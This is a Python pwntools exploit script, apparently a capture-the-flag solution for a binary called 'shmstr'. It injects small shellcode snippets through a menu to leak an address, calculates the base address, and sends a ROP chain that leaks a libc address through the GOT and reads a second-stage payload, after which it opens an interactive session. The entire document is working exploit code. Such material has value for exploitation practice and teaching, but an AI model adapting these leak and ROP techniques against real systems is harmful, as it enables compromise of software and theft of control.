from pwn import *

io = process("./shmstr")

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx,arg):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))
    io.sendlineafter("{?} Enter shellcode argument: ",str(arg))

payload = asm("""
                push ebx
                pop eax
                push eax
                pop eax
                push eax
                pop eax
""")

print(payload)

add(payload)
run(0,551)

io.recvuntil("{!} Shellcode return code = ")
leak = hex(int(io.recvline().strip()))
log.info("leak @ "+str(leak))

payload = asm("""
              pop edx
              pop edx
              push ebp
              dec ecx
              dec ecx
              push edx
""")
print(payload)
base = int(leak,16) - 0x3f9c

puts = 0x000013a3
pop_ebx = base + 0x00001022
ebp = base+0x4100
pop_ebp = base+0x000019d3
puts_plt = base + 0x00001190
read_plt = base + 0x00001130
got = base + 0x3fbc
pop_pop = base + 0x0000101f
bss = base + 0x4048
leave_ret = base + 0x00001291

add(payload)
run(1,int(leak,16)-9849)
payload = "aaaa"
payload += p32(puts_plt)
payload += p32(pop_pop)
payload += p32(got)
payload += p32(0)*2
payload += p32(read_plt)
payload += p32(0xdeadbeef)
payload += p32(0) + p32(bss) + p32(0x1000)
payload += p32(leave_ret)

gdb.attach(io)
io.send(payload)
libc = u32(io.recv(4))
log.info("libc @ "+str(hex(libc)))
io.interactive()
